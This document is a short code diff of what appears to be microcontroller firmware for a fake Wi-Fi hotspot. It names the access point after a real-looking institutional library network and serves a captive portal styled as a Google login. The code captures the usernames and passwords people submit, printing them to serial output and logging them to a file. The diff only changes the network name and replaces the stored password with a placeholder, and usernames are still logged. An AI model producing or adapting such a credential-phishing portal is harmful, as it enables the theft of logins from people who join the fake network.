@@ -16,7 +16,7 @@
 #define RESPOSTASFILE "/respostas.txt"
 
 // Ponto de acesso
-const char *ssid = "SENAI-FHZ-BIBLIOTECA";
+const char *ssid = "SENAI-FHZ-BIBLIOTECA_2";
 
 // Páginas HTML
 #define captivePortalPage GOOGLE_HTML
@@ -107,7 +107,7 @@ void setup() {
     String user = server.arg("user");
     String pass = server.arg("pass");
 
-    serialString = user + ":" + pass;
+    serialString = user + ":" + " SUA SENHA AQUI ";
     Serial.println(serialString);
 
     File f = SPIFFS.open(LOGFILE, "a");
@@ -115,7 +115,7 @@ void setup() {
       f.print("Login: ");
       f.print(user);
       f.print(" | Senha: ");
-      f.println(pass);
+      f.println(" SUA SENHA AQUI ");
       f.close();
     }
 
